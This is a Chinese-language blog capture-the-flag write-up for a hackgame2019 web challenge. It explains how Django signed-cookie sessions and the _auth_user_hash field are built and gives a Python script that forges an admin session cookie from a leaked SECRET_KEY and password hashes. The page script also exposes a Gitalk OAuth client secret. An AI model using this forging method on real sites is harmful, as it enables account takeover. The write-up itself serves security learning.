@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>从hackgame2019一道web分析django session-cookie安全性 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <!-- <i class="fas fa-cat" style="margin-right: 10px"></i> -->
+      <span>Mads Blog | 还不是为了在平凡世界寻宝物。</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>从hackgame2019一道web分析django session-cookie安全性</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年10月30日</time>
+            
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年10月30日</time>
+          </div>
+          
+          <p>首发于先知社区。</p>
+<h2 id="被泄漏的姜戈"><a href="#被泄漏的姜戈" class="headerlink" title="被泄漏的姜戈"></a>被泄漏的姜戈</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>「听说有离职的同学，把你们的代码和数据库泄漏了出去？好像还在什么 hub 还是 lab 来着建了一个叫 openlug……」</p>
+<p>「没关系，反正 admin 用户的密码长度有 1024 位，我自己都忘了密码，就算老天爷来了，也看不到我们的 flag！」</p>
+<p><a href="http://202.38.93.241:10019/" target="_blank" rel="noopener">http://202.38.93.241:10019/</a></p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>首先根据提示，从Github下载到了题目的源码：openlug/django-common</p>
+<p>理一下源码，发现是用Django写的一个简单的登录应用，而且是用<code>django-admin</code>生成的模板代码改的。在<code>settings.py</code>里面找到了一些有用的信息。</p>
+<p>源码23行记录了Django使用的<code>SECRET_KEY</code>，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Quick-start development settings - unsuitable for production</span></span><br><span class="line"><span class="comment"># See https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SECURITY WARNING: keep the secret key used in production non-secret!</span></span><br><span class="line">SECRET_KEY = <span class="string">'d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39'</span></span><br></pre></td></tr></table></figure>
+<p>第57行配置了应用所使用的session存储方式是<code>signed_cookies</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROOT_URLCONF = <span class="string">'openlug.urls'</span></span><br><span class="line"><span class="comment"># for database performance</span></span><br><span class="line">SESSION_ENGINE = <span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line"><span class="comment"># javascript code can get document.cookie, debug</span></span><br><span class="line">SESSION_COOKIE_HTTPONLY = <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
+<p>Django有很多种session的存储方式，查阅<a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/" target="_blank" rel="noopener">文档</a>大概有以下几种</p>
+<ul>
+<li>Using database-backed sessions</li>
+<li>Using cached sessions</li>
+<li>Using file-based sessions</li>
+<li>Using cookie-based sessions</li>
+</ul>
+<p>其中cookie-based sessions是一种客户端session，与flask的那种客户端session一个原理。是将session里的字段通过Django自己设计的sign算法签名编码之后存放在客户端的cookie中，然后每次客户端带着这个cookie访问，服务端再次通过sign算法验证，从而拿到session。</p>
+<p>利用django的sign算法编码与解码session的例子如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>value = signing.dumps(&#123;<span class="string">"foo"</span>: <span class="string">"bar"</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>value</span><br><span class="line"><span class="string">'eyJmb28iOiJiYXIifQ:1NMg1b:zGcDE4-TCkaeGzLeW9UQwZesciI'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>signing.loads(value)</span><br><span class="line">&#123;<span class="string">'foo'</span>: <span class="string">'bar'</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是loads和dumps时候其实是要带上一个额外的key参数的，如果不配置就默认是app的SECRET_KEY，但命令行启动的环境是没有配置的，所以我们带上key才可以进行解码。</p>
+<p>然后我利用上面django提供的api进行session解码，发现解不了。题目中给的SECRET_KEY应该是没问题的，看API文档发现还有个salt参数，默认值是<code>&quot;django.core.signing&quot;</code>。猜想可能是这个参数错了。</p>
+<blockquote>
+<p>dumps(obj, key=None, salt=’django.core.signing’, compress=False)[source]¶<br>Returns URL-safe, sha1 signed base64 compressed JSON string. Serialized object is signed using TimestampSigner.</p>
+</blockquote>
+<blockquote>
+<p>loads(string, key=None, salt=’django.core.signing’, max_age=None)[source]¶<br>Reverse of dumps(), raises BadSignature if signature fails. Checks max_age (in seconds) if given.</p>
+</blockquote>
+<p>只能翻源码找这个salt到底是什么。这里应该很容易发现dumps和loads的参数是一样的，所以找到了<code>signed_cookies</code>的dumps方法和loads方法等效。</p>
+<p>在<code>django/django/contrib/sessions/backends/signed_cookies.py</code>的SessionStore-&gt;load方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.sessions.backends.base <span class="keyword">import</span> SessionBase</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionStore</span><span class="params">(SessionBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Load the data from the key itself instead of fetching from some</span></span><br><span class="line"><span class="string">        external data store. Opposite of _get_session_key(), raise BadSignature</span></span><br><span class="line"><span class="string">        if signature fails.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> signing.loads(</span><br><span class="line">                self.session_key,</span><br><span class="line">                serializer=self.serializer,</span><br><span class="line">                <span class="comment"># This doesn't handle non-default expiry dates, see #19201</span></span><br><span class="line">                max_age=self.get_session_cookie_age(),</span><br><span class="line">                salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>,</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment"># BadSignature, ValueError, or unpickling exceptions. If any of</span></span><br><span class="line">            <span class="comment"># these happen, reset the session.</span></span><br><span class="line">            self.create()</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>发现session的载入方法就是封装了一层<code>signing.loads</code>，然后指定了特定的<code>salt</code>为<code>&quot;django.contrib.sessions.backends.signed_cookies&quot;</code>。利用这个发现，我们可以decode题目中给出的session-cookie了。</p>
+<p>目前为止，我们有：</p>
+<ul>
+<li>SECRET_KEY = ‘d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39’</li>
+<li>session_cookie: .eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKPsz:xrFwkuWPqOeflwOyQzcnEZF3gqQ</li>
+</ul>
+<p>调用decode api解码得到如下结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;signing.loads(session_cookie,key=<span class="string">"d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39"</span>,salt=<span class="string">"django.contrib.sessions.backends.signed_cookies"</span>)</span><br><span class="line">&#123;<span class="string">'_auth_user_id'</span>: <span class="string">'2'</span>, <span class="string">'_auth_user_backend'</span>: <span class="string">'django.contrib.auth.backends.ModelBackend'</span>, <span class="string">'_auth_user_hash'</span>: <span class="string">'0a884f8b987fca1a92c6f93d9042d83eea72d98d'</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到有三个字段</p>
+<ul>
+<li>_auth_user_id</li>
+<li>_auth_user_backend</li>
+<li>_auth_user_hash</li>
+</ul>
+<p>这时候我尝试只修改<code>_auth_user_id</code>字段为<code>1</code>，然后encode之后，登录失败了。猜想可能后面的<code>_auth_user_hash</code>字段也要正确才能通过验证。于是继续翻源码，</p>
+<p>在django/django/contrib/auth/<strong>init</strong>.py我们发现了登录验证函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> apps <span class="keyword">as</span> django_apps</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.core.exceptions <span class="keyword">import</span> ImproperlyConfigured, PermissionDenied</span><br><span class="line"><span class="keyword">from</span> django.middleware.csrf <span class="keyword">import</span> rotate_token</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> constant_time_compare</span><br><span class="line"><span class="keyword">from</span> django.utils.module_loading <span class="keyword">import</span> import_string</span><br><span class="line"><span class="keyword">from</span> django.utils.translation <span class="keyword">import</span> LANGUAGE_SESSION_KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .signals <span class="keyword">import</span> user_logged_in, user_logged_out, user_login_failed</span><br><span class="line"></span><br><span class="line">SESSION_KEY = <span class="string">'_auth_user_id'</span></span><br><span class="line">BACKEND_SESSION_KEY = <span class="string">'_auth_user_backend'</span></span><br><span class="line">HASH_SESSION_KEY = <span class="string">'_auth_user_hash'</span></span><br><span class="line">REDIRECT_FIELD_NAME = <span class="string">'next'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(request, user, backend=None)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Persist a user id and a backend in the request. This way a user doesn't</span></span><br><span class="line"><span class="string">    have to reauthenticate on every request. Note that data set during</span></span><br><span class="line"><span class="string">    the anonymous session is retained when the user logs in.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    session_auth_hash = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        user = request.user</span><br><span class="line">    <span class="keyword">if</span> hasattr(user, <span class="string">'get_session_auth_hash'</span>):</span><br><span class="line">        session_auth_hash = user.get_session_auth_hash()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SESSION_KEY <span class="keyword">in</span> request.session:</span><br><span class="line">        <span class="keyword">if</span> _get_user_session_key(request) != user.pk <span class="keyword">or</span> (</span><br><span class="line">                session_auth_hash <span class="keyword">and</span></span><br><span class="line">                <span class="keyword">not</span> constant_time_compare(request.session.get(HASH_SESSION_KEY, <span class="string">''</span>), session_auth_hash)):</span><br><span class="line">            <span class="comment"># To avoid reusing another user's session, create a new, empty</span></span><br><span class="line">            <span class="comment"># session if the existing session corresponds to a different</span></span><br><span class="line">            <span class="comment"># authenticated user.</span></span><br><span class="line">            request.session.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.session.cycle_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        backend = backend <span class="keyword">or</span> user.backend</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        backends = _get_backends(return_tuples=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">if</span> len(backends) == <span class="number">1</span>:</span><br><span class="line">            _, backend = backends[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(</span><br><span class="line">                <span class="string">'You have multiple authentication backends configured and '</span></span><br><span class="line">                <span class="string">'therefore must provide the `backend` argument or set the '</span></span><br><span class="line">                <span class="string">'`backend` attribute on the user.'</span></span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(backend, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'backend must be a dotted import path string (got %r).'</span> % backend)</span><br><span class="line"></span><br><span class="line">    request.session[SESSION_KEY] = user._meta.pk.value_to_string(user)</span><br><span class="line">    request.session[BACKEND_SESSION_KEY] = backend</span><br><span class="line">    request.session[HASH_SESSION_KEY] = session_auth_hash</span><br><span class="line">    <span class="keyword">if</span> hasattr(request, <span class="string">'user'</span>):</span><br><span class="line">        request.user = user</span><br><span class="line">    rotate_token(request)</span><br><span class="line">    user_logged_in.send(sender=user.__class__, request=request, user=user)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以看到调用了<code>user.get_session_auth_hash()</code>获得<code>session_auth_hash</code>，并且之后赋值给了<code>request.session[HASH_SESSION_KEY] = session_auth_hash</code>，而<code>HASH_SESSION_KEY</code>就是字符串<br><code>&quot;_auth_user_hash&quot;</code>，所以我们跟进<code>user.get_session_auth_hash()</code></p>
+<p>在django/django/contrib/auth/base_user.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session_auth_hash</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Return an HMAC of the password field.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">key_salt = <span class="string">"django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"</span></span><br><span class="line"><span class="keyword">return</span> salted_hmac(key_salt, self.password).hexdigest()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以发现就是<code>key_salt</code>和<code>self.password</code>传入<code>salted_hmac</code>进行hash。但这里用到了<code>self.password</code>，也就是说想计算这个hash值还需要知道密码才行。但我们计算这个hash的目的就是为了伪造session，如果密码都知道了那还伪造个毛？直接登录不就可以了？这里感觉有点奇怪，不应该用密码才对。我们看看这个<code>self.password</code>是怎么来的：</p>
+<p>在django/django/contrib/auth/base_user.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractBaseUser</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_password</span><span class="params">(self, raw_password)</span>:</span></span><br><span class="line">        self.password = make_password(raw_password)</span><br><span class="line">        self._password = raw_password</span><br></pre></td></tr></table></figure>
+<p>我们发现<code>self.password</code>其实并不是raw_password，raw_password其实是存在了<code>self._password</code>变量里面，真是具有迷惑性的名字。我们跟进<code>make_password</code>函数：</p>
+<p>在django/django/contrib/auth/handlers.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_password</span><span class="params">(password, salt=None, hasher=<span class="string">'default'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Turn a plain-text password into a hash for database storage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Same as encode() but generate a new random salt. If password is None then</span></span><br><span class="line"><span class="string">    return a concatenation of UNUSABLE_PASSWORD_PREFIX and a random string,</span></span><br><span class="line"><span class="string">    which disallows logins. Additional random string reduces chances of gaining</span></span><br><span class="line"><span class="string">    access to staff or superuser accounts. See ticket #20079 for more info.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> password <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> UNUSABLE_PASSWORD_PREFIX + get_random_string(UNUSABLE_PASSWORD_SUFFIX_LENGTH)</span><br><span class="line">    hasher = get_hasher(hasher)</span><br><span class="line">    salt = salt <span class="keyword">or</span> hasher.salt()</span><br><span class="line">    <span class="keyword">return</span> hasher.encode(password, salt)</span><br></pre></td></tr></table></figure>
+<p>发现<code>make_password</code>函数原始的作用是<code>Turn a plain-text password into a hash for database storage</code>，也就是说这个函数是计算原始明文密码的hash的，这个hash是存在数据库里面的，也就是通常大家在脱库时候脱出来的密码md5类似。</p>
+<p>所以这里就很明了了。整个<code>_auth_user_hash</code>字段的计算就是</p>
+<p><code>raw_password</code> &gt; <code>make_password(raw_password)</code> &gt; <code>salted_hmac(key_salt, make_password(raw_password)).hexdigest()</code></p>
+<p>而这里的key_salt在django/django/contrib/auth/base_user.py直接给出了，<code>make_password(raw_password)</code>的值也存放在数据库里面，也是知道的，这样就可以计算出<code>_auth_user_hash</code>的值，从而伪造session了。</p>
+<p>至此，翻源码到此为止了，整个session_cookie的生成以及session里面的各个字段的生成原理也搞明白了。</p>
+<p>这里可以看出来是有两重的保护的。</p>
+<ol>
+<li>Django这个框架的<code>SECRET_KEY</code>保证了session_cookie没法被恶意篡改</li>
+<li>django-admin这个框架的<code>_auth_user_hash</code>保证攻击者还要拿到密码的哈希值才能进行伪造</li>
+</ol>
+<p>本题就是同时泄露了<code>SECRET_KEY</code>和密码哈希，所以才能进行伪造。</p>
+<p>下面是简单的验证代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> salted_hmac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">'d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39'</span></span><br><span class="line">guest_hash = <span class="string">'pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM='</span></span><br><span class="line">admin_hash = <span class="string">'pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE='</span></span><br><span class="line"></span><br><span class="line">guest_session_cookie = <span class="string">'.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKPsz:xrFwkuWPqOeflwOyQzcnEZF3gqQ'</span></span><br><span class="line">signed_cookie_slat = <span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># load guest session_cookie</span></span><br><span class="line">guest_session_cookie_dict = signing.loads(guest_session_cookie,key=SECRET_KEY,salt=signed_cookie_slat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;'_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d'&#125;</span></span><br><span class="line"></span><br><span class="line">key_salt = <span class="string">"django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># validate "_auth_user_hash"</span></span><br><span class="line"><span class="keyword">assert</span> salted_hmac(key_salt, guest_hash, secret=SECRET_KEY).hexdigest() == guest_cookie_dict[<span class="string">'_auth_user_hash'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># no message is good message</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake session cookie</span></span><br><span class="line">fake_admin_session_cookie_dict = &#123;<span class="string">'_auth_user_id'</span>: <span class="string">'1'</span>, <span class="string">'_auth_user_backend'</span>: <span class="string">'django.contrib.auth.backends.ModelBackend'</span>, <span class="string">'_auth_user_hash'</span>: <span class="string">'0a884f8b987fca1a92c6f93d9042d83eea72d98d'</span>&#125;</span><br><span class="line"></span><br><span class="line">fake_admin_session_cookie_dict[<span class="string">'_auth_user_hash'</span>] = salted_hmac(key_salt, admin_hash, secret=SECRET_KEY).hexdigest() </span><br><span class="line"></span><br><span class="line"><span class="comment"># encode</span></span><br><span class="line">fake_admin_session_cookie = signing.dumps(fake_admin_session_cookie_dict,key=SECRET_KEY,salt=signed_cookie_slat)</span><br><span class="line"></span><br><span class="line">print(fake_admin_session_cookie)</span><br></pre></td></tr></table></figure>
+<p>完。</p>
+
+           
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#被泄漏的姜戈"><span class="toc-number">1.</span> <span class="toc-text">被泄漏的姜戈</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: "6b81331560c108209346bc4807a5126da190e14c",
+  repo: "blogcomments",
+  owner: "lxzmads",
+  admin: "lxzmads",
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: "false"  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lxzmads/hexo-theme-Aath-magic" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
